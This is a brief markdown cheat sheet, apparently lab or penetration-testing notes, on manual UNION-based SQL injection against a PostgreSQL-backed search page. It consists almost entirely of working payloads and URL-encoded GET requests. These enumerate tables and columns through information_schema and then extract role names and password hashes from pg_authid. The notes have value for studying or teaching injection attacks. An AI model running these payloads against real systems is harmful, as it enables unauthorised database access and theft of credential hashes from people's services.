# SQL INJECTION

## POSTGREE

# #1 - Getting tables information (MANUALLY)
First we need to test if the web is vulnerable to sql injection.

```console
Based on query discovered by getting error

select * cars where name ilike='%

Must be encoded in URL
a' union all select NULL,table_name,NULL,NULL,NULL from information_schema.tables--

GET /dashboard.php?search=a%27%20union%20all%20select%20NULL,table_name,NULL,NULL,NULL%20from%20information_schema.tables-- HTTP/1.1
```
getting data from information schema columns
```console
GET /dashboard.php?search=a%27%20union%20all%20select%20NULL,column_name,NULL,NULL,NULL%20from%20information_schema.columns%20where%20table_name=%27pg_authid%27--
```
Getting contents of pg_authid
```console
elixir' union all select NULL,rolname,rolpassword,NULL,NULL from pg_authid-- 
GET /dashboard.php?search=a%27%20union%20all%20select%20NULL,rolname,rolpassword,NULL,NULL%20from%20pg_authid--
```
